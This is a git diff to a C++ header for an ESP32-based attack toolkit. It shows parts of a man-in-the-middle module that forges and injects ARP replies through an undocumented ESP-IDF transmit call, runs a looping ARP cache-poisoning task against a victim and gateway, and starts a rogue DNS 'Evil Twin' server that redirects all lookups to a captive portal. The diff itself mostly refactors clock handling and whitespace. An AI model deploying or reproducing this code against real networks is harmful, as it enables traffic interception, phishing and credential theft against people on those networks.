@@ -44,8 +44,6 @@
 #include <Nyxus/nyx_network_types.hpp>
 #include <RTClib.h>
 
-extern RTC_DS3231 rtc;
-
 // The Undocumented ESP-IDF C-Bridge: Allows injecting raw Ethernet frames directly into the hardware encryption pipeline
 extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t wifi_if, void *buffer, uint16_t len);
 
@@ -61,6 +59,12 @@ class NYXUS_MITM {
    * @brief Handle for the FreeRTOS background task managing the Rogue DNS server.
    */
    TaskHandle_t dns_task_handle = nullptr;
+
+   private:
+   /**
+   * @brief Pointer to the global real time clock if available
+   */
+   RTC_DS3231* rtc = nullptr;
 
    private:
    /** 
@@ -90,19 +94,19 @@ class NYXUS_MITM {
    /** 
    * @brief  The MAC address of the ESP32 hardware interface.
    */
-   uint8_t  host_mac[6] = {0};
+   uint8_t host_mac[6] = {0};
 
    private:
    /** 
    * @brief Target machine's physical MAC address.
    */
-   uint8_t  target_mac[6] = {0};
+   uint8_t target_mac[6] = {0};
 
    private:
    /** 
    * @brief Network router's physical MAC address.
    */
-   uint8_t  router_mac[6] = {0};
+   uint8_t router_mac[6] = {0};
 
    private:
    /**
@@ -132,7 +136,7 @@ class NYXUS_MITM {
    /**
    * @brief Instantiates the Man-in-the-Middle command module.
    */
-   NYXUS_MITM(bool toggleVerbosity = true, bool timestamp = true): verbose(toggleVerbosity), timestampEnabled(timestamp) {}
+   NYXUS_MITM(bool toggleVerbosity = true, bool timestamp = true, RTC_DS3231* rtc = nullptr): verbose(toggleVerbosity), timestampEnabled(timestamp), rtc(rtc) {}
 
    private:
    /**
@@ -145,13 +149,13 @@ class NYXUS_MITM {
    /**
    * @brief Converts a human-readable MAC string ("AA:BB:CC:DD:EE:FF") into a 6-byte hardware array.
    */
-inline void  parse_mac(const char* mac_str, uint8_t* mac_array);
+   inline void parse_mac(const char* mac_str, uint8_t* mac_array);
 
    private:
    /**
    * @brief Crafts and encrypts a malicious Layer 2.5 ARP Reply.
    */
-inline void  ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip);
+   inline void ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip);
 
    private:
    /**
@@ -167,13 +171,13 @@ inline void  ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t
    * @param gatewayIP Network router IPv4.
    * @param gatewayMAC Network router MAC.
    */
-inline void  StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC);
+   inline void StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC);
 
    public:
    /**
    * @brief Stops the dual-threaded Man-in-the-Middle ARP Cache Poisoning attack.
    */
-inline void  StopArpSpoof();
+   inline void StopArpSpoof();
 
    private:
    /**
@@ -192,28 +196,28 @@ inline void  StopArpSpoof();
    * @param captive_portal_ip The IPv4 address of your ESP32's web server (e.g. "192.168.4.1")
    * @attention Must be called after `NYXUS_WIFI::ChangeMode(WifiMode::assertive)`.
    */
-inline void  StartEvilTwin(const std::string& captive_portal_ip);
+   inline void StartEvilTwin(const std::string& captive_portal_ip);
 
    public:
    /**
    * @brief Stops the Evil Twin DNS interceptor engine.
    */
-inline void  StopEvilTwin();
+   inline void StopEvilTwin();
 };
 
 /* IMPLEMENTATIONS - NOTHING HERE */
 
 inline void NYXUS_MITM::timestamp(){
    if (!timestampEnabled) return;
-   DateTime now = rtc.now();
+   DateTime now = rtc->now();
    Serial.printf("[%s%d-%d-%d %d:%d:%d%s] ", Color::CYAN, now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second(), Color::RESET);
 }
 
-inline void  NYXUS_MITM::parse_mac(const char* mac_str, uint8_t* mac_array) {
+inline void NYXUS_MITM::parse_mac(const char* mac_str, uint8_t* mac_array) {
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac_array[0], &mac_array[1], &mac_array[2], &mac_array[3], &mac_array[4], &mac_array[5]);
 }
 
-inline void  NYXUS_MITM::ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip) {
+inline void NYXUS_MITM::ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_mac, uint32_t spoofed_ip, uint32_t target_ip) {
    uint8_t frame[sizeof(MITM::ethernet_header) + sizeof(MITM::arp_header)] = {0};
    MITM::ethernet_header* eth = (MITM::ethernet_header*)frame;
    MITM::arp_header* arp = (MITM::arp_header*)(frame + sizeof(MITM::ethernet_header));
@@ -232,7 +236,7 @@ inline void  NYXUS_MITM::ForgeAndInjectARP(uint8_t* dest_mac, uint8_t* spoofed_m
    esp_wifi_internal_tx(WIFI_IF_STA, frame, sizeof(frame));
 }
 
-inline void  NYXUS_MITM::arp_poison_task(void* arg) {
+inline void NYXUS_MITM::arp_poison_task(void* arg) {
    NYXUS_MITM* mitm = static_cast<NYXUS_MITM*>(arg);
    bool first_run = true;
    while(mitm->arp_active) {
@@ -254,7 +258,7 @@ inline void  NYXUS_MITM::arp_poison_task(void* arg) {
    vTaskDelete(NULL);
 }
 
-inline void  NYXUS_MITM::StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC) {
+inline void NYXUS_MITM::StartArpSpoof(const std::string& victimIP, const std::string& victimMAC, const std::string& gatewayIP, const std::string& gatewayMAC) {
    if (arp_task_handle != nullptr) return;
    esp_wifi_get_mac(WIFI_IF_STA, host_mac);
    parse_mac(victimMAC.c_str(), target_mac);
@@ -270,7 +274,7 @@ inline void  NYXUS_MITM::StartArpSpoof(const std::string& victimIP, const std::s
    xTaskCreatePinnedToCore(arp_poison_task, "ARP_Spoof", 3072, this, 1, &arp_task_handle, 1);
 }
 
-inline void  NYXUS_MITM::StopArpSpoof() {
+inline void NYXUS_MITM::StopArpSpoof() {
    if (arp_active) {
       arp_active = false;
       while(arp_task_handle != nullptr) vTaskDelay(pdMS_TO_TICKS(10));
@@ -281,7 +285,7 @@ inline void  NYXUS_MITM::StopArpSpoof() {
    }
 }
 
-inline void  NYXUS_MITM::dns_spoof_task(void* arg) {
+inline void NYXUS_MITM::dns_spoof_task(void* arg) {
    NYXUS_MITM* mitm = static_cast<NYXUS_MITM*>(arg);
    mitm->dns_sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    struct sockaddr_in server_addr = {0};
@@ -328,7 +332,7 @@ inline void  NYXUS_MITM::dns_spoof_task(void* arg) {
    vTaskDelete(NULL);
 }
 
-inline void  NYXUS_MITM::StartEvilTwin(const std::string& captive_portal_ip) {
+inline void NYXUS_MITM::StartEvilTwin(const std::string& captive_portal_ip) {
    if (dns_task_handle != nullptr) return;
    inet_pton(AF_INET, captive_portal_ip.c_str(), &captive_ip_addr);
    if (verbose) {
@@ -336,12 +340,11 @@ inline void  NYXUS_MITM::StartEvilTwin(const std::string& captive_portal_ip) {
       timestamp(); Serial.printf("[%sEVIL TWIN%s] Igniting Rogue DNS Server...\n", Color::MAGENTA, Color::RESET);
       timestamp(); Serial.printf("[%sDNS%s] Force-routing all HTTP traffic to %s\n", Color::YELLOW, Color::RESET, captive_portal_ip.c_str());
    }
-   
    dns_active = true;
    xTaskCreatePinnedToCore(dns_spoof_task, "DNS_Spoofer", 4096, this, 1, &dns_task_handle, 1);
 }
 
-inline void  NYXUS_MITM::StopEvilTwin() {
+inline void NYXUS_MITM::StopEvilTwin() {
    if (dns_active) {
       dns_active = false;
       while(dns_task_handle != nullptr) vTaskDelay(pdMS_TO_TICKS(10));
@@ -351,4 +354,5 @@ inline void  NYXUS_MITM::StopEvilTwin() {
       }
    }
 }
+
 #endif
